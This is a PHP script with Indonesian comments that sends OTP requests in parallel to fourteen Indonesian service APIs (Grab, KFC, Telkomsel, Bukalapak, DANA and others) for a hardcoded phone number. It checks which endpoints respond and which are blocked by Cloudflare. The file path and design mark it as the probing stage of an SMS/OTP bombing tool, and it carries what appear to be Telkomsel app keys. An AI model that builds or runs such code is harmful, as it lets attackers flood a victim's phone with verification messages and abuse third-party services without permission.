<?php
// Probe kandidat endpoint OTP (paralel) buat tau mana yang reachable + kena Cloudflare challenge atau nggak.
// Placeholder: {P}=6283822461998  {L}=083822461998  {N}=83822461998  {D}=uuid device

$P = '6283822461998';
$L = '083822461998';
$N = '83822461998';
$D = trim((string) @file_get_contents('/home/runner/bom/.device-id'));
$UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Mobile Safari/537.36';

$eps = [
    [ 'name' => 'duniagames', 'm' => 'POST', 'url' => 'https://api.duniagames.co.id/api/user/api/v2/user/send-otp',
      'h' => ['Accept: application/json, text/plain, */*', 'Content-Type: application/json', 'Origin: https://duniagames.co.id', 'Referer: https://duniagames.co.id/', 'Ciam-Type: FR', 'x-device: {D}'],
      'b' => '{"phoneNumber":"+{P}","userName":"{L}"}' ],

    [ 'name' => 'kfc', 'm' => 'POST', 'url' => 'https://api.kfcindonesia.com/kfc_mobile/v1/customers/request-otp',
      'h' => ['Content-Type: application/json', 'appid: 1', 'version: 3.1.4', 'Origin: https://app.kfcindonesia.com', 'Referer: https://app.kfcindonesia.com/'],
      'b' => '{"msisdn":"{P}"}' ],

    [ 'name' => 'grab', 'm' => 'POST', 'url' => 'https://api.grab.com/grabid/v1/otp/request/',
      'h' => ['Content-Type: application/x-www-form-urlencoded'],
      'b' => 'country_calling_code=62&phone={N}' ],

    [ 'name' => 'telkomsel', 'm' => 'POST', 'url' => 'https://api.mytelkomsel.net/user/account/send-otp',
      'h' => ['Content-Type: application/json', 'app_id: 43B1343659224291', 'app_key: 365309fe7ce96d54', 'Accept: application/json'],
      'b' => '{"phone":"{P}","type":"MSISDN"}' ],

    [ 'name' => 'roadmoto', 'm' => 'POST', 'url' => 'https://www.roadmotonline.com/api/v1/login/otp',
      'h' => ['Content-Type: application/json', 'Platform: 3', 'Accept-Language: id-ID', 'Origin: https://www.roadmotonline.com', 'Referer: https://www.roadmotonline.com/'],
      'b' => '{"phone":"{P}","type":"otp"}' ],

    [ 'name' => 'fizzo', 'm' => 'POST', 'url' => 'https://www.fizzo.io/api/request-otp',
      'h' => ['Content-Type: application/json', 'Accept: application/json', 'Origin: https://www.fizzo.io', 'Referer: https://www.fizzo.io/'],
      'b' => '{"phoneNumber":"{P}"}' ],

    [ 'name' => 'maxstream', 'm' => 'POST', 'url' => 'https://www.maxstream.net/api/authentication/v1/otp/request',
      'h' => ['Content-Type: application/json', 'device-id: {D}', 'app-version: 4.4.0', 'x-app-id: 15', 'Accept: application/json'],
      'b' => '{"identityType":"phone","identityValue":"{P}"}' ],

    [ 'name' => 'viu', 'm' => 'POST', 'url' => 'https://www.viu.com/ott/id/v1/requestOtp/v3',
      'h' => ['Content-Type: application/json', 'Accept: application/json', 'x-app-code: 200', 'x-app-ver: 5.5.0'],
      'b' => '{"msisdn":"{P}","countryCode":"62","platform":"WEB_M","languageCode":"in","deviceID":"{D}"}' ],

    [ 'name' => 'bukalapak', 'm' => 'POST', 'url' => 'https://www.bukalapak.com/api/v2/user_phone_number_verifications/send_otp.json',
      'h' => ['Content-Type: application/x-www-form-urlencoded', 'Accept: application/json'],
      'b' => 'phone_number%5Bcountry_calling_code%5D=62&phone_number%5Bnumber%5D={N}' ],

    [ 'name' => 'vidio', 'm' => 'POST', 'url' => 'https://www.vidio.com/api/v2/users/exists_send_new?user%5Bphone%5D={P}',
      'h' => ['Accept: application/json', 'Content-Type: application/x-www-form-urlencoded'],
      'b' => '' ],

    [ 'name' => 'blibli', 'm' => 'POST', 'url' => 'https://api.blibli.com/identity/public/authentication/login-otp',
      'h' => ['Content-Type: application/json', 'Accept: application/json', 'Origin: https://www.blibli.com', 'Referer: https://www.blibli.com/'],
      'b' => '{"phoneNumber":"{P}"}' ],

    [ 'name' => 'alodokter', 'm' => 'POST', 'url' => 'https://mfes-gw.alodokter.com/api/v1/otp/send',
      'h' => ['Content-Type: application/json', 'Accept: application/json', 'x-client-id: 10001', 'x-app-name: web-alodokter'],
      'b' => '{"phone":"+{P}","channel":"sms"}' ],

    [ 'name' => 'dana', 'm' => 'POST', 'url' => 'https://api.dana.id/analyticsmemberApi/otpMember/register/',
      'h' => ['Content-Type: application/x-www-form-urlencoded', 'Accept: application/json'],
      'b' => 'phoneNumber={P}&sceneCode=LOGIN&languageCode=id-ID' ],

    [ 'name' => 'neetpay', 'm' => 'POST', 'url' => 'https://neetpay-api.roukimart.com/v2/login/otp',
      'h' => ['Content-Type: application/json', 'Accept: application/json'],
      'b' => '{"phone":"{P}"}' ],
];

$mh = curl_multi_init();
$cs = [];
foreach ($eps as $i => $e) {
    $repl = ['{P}' => $P, '{L}' => $L, '{N}' => $N, '{D}' => $D];
    $ch = curl_init();
    $url = strtr($e['url'], $repl);
    $hdrs = [];
    foreach ($e['h'] as $h) {
        $hdrs[] = strtr($h, $repl);
    }
    $hdrs[] = 'User-Agent: ' . $UA;
    $hdrs[] = 'Accept-Language: id';
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_HTTPHEADER => $hdrs,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_CONNECTTIMEOUT => 10,
        CURLOPT_TIMEOUT => 25,
        CURLOPT_FOLLOWLOCATION => false,
    ]);
    if ($e['m'] === 'POST') {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, strtr($e['b'], $repl));
    }
    curl_multi_add_handle($mh, $ch);
    $cs[$i] = $ch;
}

$running = null;
$errs = [];
do {
    curl_multi_exec($mh, $running);
    while (($info = curl_multi_info_read($mh)) !== false) {
        $idx = array_search($info['handle'], $cs, true);
        $errs[$idx] = curl_strerror($info['result']);
    }
    curl_multi_select($mh, 1.0);
} while ($running > 0);

printf("%-12s %-6s %-8s %-7s %s\n", 'ENDPOINT', 'HTTP', 'CF?', 'BYTES', 'RESULT');
foreach ($eps as $i => $e) {
    $ch = $cs[$i];
    $body = (string) curl_multi_getcontent($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $ip = (string) curl_getinfo($ch, CURLINFO_PRIMARY_IP);
    $err = $errs[$i] ?? '';
    $cf = (stripos($body, 'Just a moment') !== false || stripos($body, 'Attention Required') !== false) ? 'BLOCK' : '-';
    $snip = trim(preg_replace('/\s+/', ' ', substr($body, 0, 100)));
    if ($cf === 'BLOCK') { $snip = '(html challenge)'; }
    if ($err !== '' && $err !== 'No error') { $snip = 'GAGAL: ' . $err . '  [ip=' . ($ip ?: '-') . ']'; }
    if (stripos($body, '<!DOCTYPE') === 0 && $cf === '-') { $snip = '(html page)'; }
    if ($snip === '') { $snip = '(body kosong)  [ip=' . ($ip ?: '-') . ']'; }
    printf("%-12s %-6s %-8s %-7s %s\n", $e['name'], $code ?: '000', $cf, strlen($body), $snip);
    curl_multi_remove_handle($mh, $ch);
}
curl_multi_close($mh);
